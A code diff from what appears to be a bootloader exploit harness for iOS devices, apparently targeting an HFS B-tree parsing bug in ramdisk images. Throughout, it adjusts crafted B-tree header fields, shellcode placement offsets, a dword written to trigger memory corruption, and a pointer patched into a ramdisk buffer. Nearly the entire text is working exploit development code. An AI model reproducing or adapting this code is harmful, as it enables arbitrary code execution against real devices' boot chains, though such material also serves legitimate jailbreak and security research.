@@ -54,6 +54,11 @@
 #define BINS_ADDR               (0x447A0 + 0x28)
 #define BINS_LEN                (0x20 * 0x4)
 
+#define START_OF_BTREE_HEADER   0x44594
+#define START_OF_EXTENTS_BTREE_HEADER (START_OF_BTREE_HEADER + 0x100) /* 0x44694 */
+#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x2C) /* 0x54 is the right one, but we can't insert the shellcode in the btree header due to size constraints */
+#define START_OF_SHELLCODE (ALIGNED_POINTER_OFFSET + 0x48)
+
 void NAKED
 my_breakpoint1(void)
 {
@@ -220,7 +225,7 @@ void
 my_adjust_environ(void)
 {
 #if 1
-    CALL(create_envvar)("boot-path", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/1/2/3/4/5/6/7/8/9/disk.dmg", 0);
+    CALL(create_envvar)("boot-path", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/disk.dmg", 0);
 #endif
 }
 
@@ -228,7 +233,7 @@ my_adjust_environ(void)
 void
 suck_sid(void)
 {
-    fprintf(stderr, "suck sid\n");
+    fprintf(stderr, "suck sid at 0x%x\n", (uintptr_t)suck_sid);
     dumpfile("DUMP2");
 }
 
@@ -246,8 +251,10 @@ drillDownPathTill(void *buffer, unsigned int seq, unsigned int depth, unsigned i
         }
         if (seq == 3 * (depth + 1) + 1 && i == to_chk) {
             /* iPhone 4 rev.A (3,2) needs +4 as offset (why?) */
-            eprintf("TRIGGERING: writed 0x%x (BE) at offset 0x%x\n", value, offset + 4);
-            PUT_DWORD_BE(buffer, offset + 4, value);
+            /* inside ramdiskF.dmg the offset to which we trigger the bug is completely different UwU */
+            offset += 4;
+            eprintf("TRIGGERING: writed 0x%x (BE) at offset 0x%x\n", value, offset);
+            PUT_DWORD_BE(buffer, offset, value);
             return 1;
         }
         i++;
@@ -271,6 +278,13 @@ my_readp(void *ih, void *buffer, long long offset, int length)
     off = lseek(rfd, offset, SEEK_SET);
     assert(off == offset);
     length = read(rfd, buffer, length);
+    
+#if 0 /* need to be enable this only if testing with ramdiskF_iloader.dmg */
+    if (offset == 0x800) {
+        PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid);
+    }
+#endif
+    
 #if TREEDEPTH || TRYFIRST || TRYLAST
 #if ARGS
 #define NODE_SIZE (node_size)
@@ -281,6 +295,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
 #define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
 #define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
     if (1) {
+        
     /* XXX stack recursion eats 208 bytes, watch out for 0x4D2C0 + 0x18 = 0x4D2D8 */
     /* XXX stack recursione eats ??? bytes watch out for 0x41350 + 0x18 = 0x41368 */
     /* that address contains the irq_disable_count of the boootstrap task */
@@ -327,11 +342,6 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_BE(buffer, 16, 0x500);            /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
                 PUT_WORD_LE(buffer, 20, 0);                /* must be zero (see above) */
                 PUT_WORD_LE(buffer, 14, 0);                /* must be zero, to allow r3 to grow */
-                
-#define START_OF_BTREE_HEADER 0x44594
-#define START_OF_EXTENTS_BTREE_HEADER (START_OF_BTREE_HEADER + 0x100) /* 0x44694 */
-#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x2C) /* 0x54 is the right one, but we can't insert the shellcode in the btree header due to size constraints */
-#define START_OF_SHELLCODE (ALIGNED_POINTER_OFFSET + 0x48)
                 
                 PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
                 
@@ -383,6 +393,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 /* END */
 #endif
                 break;
+                
 #if TREEDEPTH
             default:
             {
